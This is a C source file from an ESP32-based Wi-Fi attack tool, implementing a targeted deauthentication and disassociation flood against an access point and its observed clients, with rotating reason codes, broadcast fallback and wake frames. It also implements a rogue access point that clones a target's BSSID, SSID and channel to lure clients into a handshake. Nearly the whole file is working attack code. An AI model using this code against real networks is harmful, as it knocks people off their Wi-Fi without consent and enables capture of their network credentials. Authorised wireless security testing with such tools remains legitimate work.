/**
 * @file attack_method.c
 * @author risinek (risinek@gmail.com)
 * @date 2021-04-07
 * @copyright Copyright (c) 2021
 *
 * @date Update 2023-05-07
 * @note Updated by Zheng Lin Lei
 * @note Github: https://github.com/ZhengLinLei
 * 
 * @brief Implements common methods for various attacks
 */
#include "attack_method.h"

#include <string.h>
#define LOG_LOCAL_LEVEL ESP_LOG_VERBOSE
#include "esp_log.h"
#include "esp_err.h"
#include "esp_timer.h"
#include "esp_wifi_types.h"

#include "sdkconfig.h"
#include "wifi_controller.h"
#include "wsl_bypasser.h"

static const char *TAG = "main:attack_method";
static esp_timer_handle_t deauth_timer_handle = NULL;

/* Deauth burst state. Broadcast-only deauth is discarded by many clients, so the
   timer aims at the stations the client counter observed and keeps a broadcast
   in the rotation for the ones it never saw. */
#define DEAUTH_CLIENT_MAX 16
static uint8_t deauth_bssid[6];
static uint8_t deauth_clients[DEAUTH_CLIENT_MAX][6];
static unsigned deauth_client_count = 0;
static unsigned deauth_tick = 0;
/* Reason codes worth rotating through: 1 unspecified, 2 previous auth no longer
   valid, 4 inactivity, 7 class-3 frame from nonassociated STA, 8 leaving BSS,
   15 4-way handshake timeout. Clients filter different codes. */
static const uint8_t deauth_reasons[] = { 7, 1, 2, 4, 8, 15 };

/**
 * @brief True while the AP interface is configured as a clone of the target AP.
 *
 * A running rogue AP already owns the radio channel, so the broadcast helper
 * must not reconfigure the AP interface back to the management AP: that would
 * silently replace the clone with the management AP (and is what made the
 * "combine all" DoS method lose its rogue-AP half).
 */
static bool rogue_ap_active = false;

/**
 * @brief Callback for periodic deauthentication frame timer
 * 
 * Periodicaly called to send deauthentication frame for given AP.
 *
 * Each tick sends one unicast frame (alternating deauth/disassoc, rotating the
 * reason code) and every third tick a broadcast frame as a fallback.
 *
 * @param arg not used
 */
static void refresh_deauth_clients(void)
{
    unsigned n = wifictl_copy_client_macs(deauth_bssid, deauth_clients, DEAUTH_CLIENT_MAX);
    if (n > 0) deauth_client_count = n;
}

static void timer_send_deauth_frame(void *arg){
    (void) arg;
    deauth_tick++;

    /* Wake sleeping stations for the first ticks so they answer and the client
       table can learn their MACs. */
    if (deauth_tick <= 3) wsl_bypasser_send_null_wake(deauth_bssid);

    /* Re-read the client table about once a second. */
    if ((deauth_tick % 10) == 1) refresh_deauth_clients();

    uint8_t reason = deauth_reasons[(deauth_tick / 2) % (sizeof(deauth_reasons) / sizeof(deauth_reasons[0]))];
    bool disassoc = (deauth_tick & 1) != 0;

    if (deauth_client_count > 0) {
        unsigned idx = (deauth_tick / 2) % deauth_client_count;
        wsl_bypasser_send_deauth_to(deauth_bssid, deauth_clients[idx], reason, disassoc);
    }
    if ((deauth_tick % 3) == 0) {
        wsl_bypasser_send_deauth_broadcast(deauth_bssid, reason, disassoc);
    }
}

/**
 * @details Starts periodic timer for sending deauthentication frame via timer_send_deauth_frame().
 */
void attack_method_broadcast(const wifi_ap_record_t *ap_record, unsigned period_ms){
    if (ap_record == NULL || ap_record->primary == 0) {
        ESP_LOGE(TAG, "Cannot start broadcast deauth without a valid AP record");
        return;
    }
    if (period_ms == 0) {
        ESP_LOGW(TAG, "Invalid broadcast period, using 100 ms");
        period_ms = 100;
    }

    /* Snapshot the target so the timer never dereferences a record that a later
       scan may have overwritten. */
    memcpy(deauth_bssid, ap_record->bssid, 6);
    deauth_tick = 0;
    deauth_client_count = 0;
    refresh_deauth_clients();
    if (deauth_client_count == 0) {
        ESP_LOGI(TAG, "No known stations yet; broadcast plus wake frames until one answers");
    } else {
        ESP_LOGI(TAG, "Deauth aimed at %u known station(s)", deauth_client_count);
    }
    if (wifictl_sniffer_is_active()) {
        /* The sniffer already put the radio on the target channel. Reconfiguring
           the management AP here would restart the AP and break the capture,
           so only nudge the channel. */
        wifictl_set_channel(ap_record->primary);
    } else if (rogue_ap_active) {
        /* The rogue AP owns the channel and the AP interface; reconfiguring it
           here would overwrite the clone with the management AP. */
        wifictl_set_channel(ap_record->primary);
    } else {
        /* No sniffer and no rogue AP: in APSTA mode the management AP owns the
           channel and a plain esp_wifi_set_channel() is undone by the running
           AP, so the AP has to be reconfigured to actually move the radio. */
        wifictl_move_mgmt_ap_to_channel(ap_record->primary);
    }
    const esp_timer_create_args_t deauth_timer_args = {
        .callback = &timer_send_deauth_frame,
        .arg = NULL
    };
    esp_err_t err = esp_timer_create(&deauth_timer_args, &deauth_timer_handle);
    if (err != ESP_OK) {
        ESP_LOGE(TAG, "Failed to create deauth timer: %s", esp_err_to_name(err));
        return;
    }
    err = esp_timer_start_periodic(deauth_timer_handle, (uint64_t) period_ms * 1000ULL);
    if (err != ESP_OK) {
        ESP_LOGE(TAG, "Failed to start deauth timer: %s", esp_err_to_name(err));
        esp_timer_delete(deauth_timer_handle);
        /* Clear the handle: leaving it dangling made the next stop call delete an
           already freed timer. */
        deauth_timer_handle = NULL;
    }
}

void attack_method_broadcast_stop(){
    esp_timer_handle_t handle = deauth_timer_handle;
    if (handle == NULL) return;
    /* Clear the shared handle first so a concurrent stop cannot delete it twice. */
    deauth_timer_handle = NULL;
    if (esp_timer_is_active(handle)) {
        esp_err_t err = esp_timer_stop(handle);
        if (err != ESP_OK && err != ESP_ERR_INVALID_STATE) {
            ESP_LOGW(TAG, "Failed to stop deauth timer: %s", esp_err_to_name(err));
        }
    }
    esp_timer_delete(handle);

    /* The broadcast path moved the management AP onto the target channel; put it
       back so the device ends in a known state (the screen shows the configured
       channel). A rogue AP owns the channel itself, so leave it alone. */
    if (!rogue_ap_active) {
        wifictl_move_mgmt_ap_to_channel(CONFIG_MGMT_AP_CHANNEL);
    }
}

/**
 * @brief Map a scanned AP's authmode onto a mode the soft-AP can advertise.
 *
 * The clone only has to look like the target long enough for a client to try
 * the 4-way handshake, so enterprise/WAPI/OWE (and the WPA3-EXT-PSK modes that
 * ESP-IDF 6.x turned into placeholders) are mapped to WPA2-PSK. Passing such a
 * mode through would make esp_wifi_set_config() reject the whole clone.
 */
static wifi_auth_mode_t cloneable_authmode(wifi_auth_mode_t mode)
{
    switch (mode) {
        case WIFI_AUTH_OPEN:
        case WIFI_AUTH_WPA_PSK:
        case WIFI_AUTH_WPA2_PSK:
        case WIFI_AUTH_WPA_WPA2_PSK:
        case WIFI_AUTH_WPA3_PSK:
        case WIFI_AUTH_WPA2_WPA3_PSK:
            return mode;
        default:
            return WIFI_AUTH_WPA2_PSK;
    }
}

/**
 * @note BSSID is MAC address of APs Wi-Fi interface
 * 
 * @param ap_record target AP that will be cloned/duplicated
 */
void attack_method_rogueap(const wifi_ap_record_t *ap_record){
    if (ap_record == NULL || ap_record->primary == 0) {
        ESP_LOGE(TAG, "Cannot start a rogue AP without a valid AP record");
        return;
    }
    ESP_LOGD(TAG, "Configuring Rogue AP");
    wifictl_set_ap_mac(ap_record->bssid);
    wifi_config_t ap_config = {
        .ap = {
            .ssid_len = strlen((char *)ap_record->ssid),
            .channel = ap_record->primary,
            .authmode = cloneable_authmode(ap_record->authmode),
            .max_connection = 1
        },
    };
    /* An open clone must not carry a password, and ESP-IDF rejects a
       WPA2/WPA3 config whose password is shorter than 8 characters. */
    if (ap_config.ap.authmode != WIFI_AUTH_OPEN) {
        strncpy((char *) ap_config.ap.password, "dummypassword",
                sizeof(ap_config.ap.password) - 1);
    }
    mempcpy(ap_config.ap.ssid, ap_record->ssid, 32);
    wifictl_ap_start(&ap_config);
    rogue_ap_active = true;
}

/**
 * @brief Stops the rogue AP and brings the management AP back.
 *
 * Safe to call when no rogue AP is running.
 */
void attack_method_rogueap_stop(void){
    if (!rogue_ap_active) return;
    wifictl_mgmt_ap_start();
    wifictl_restore_ap_mac();
    rogue_ap_active = false;
}
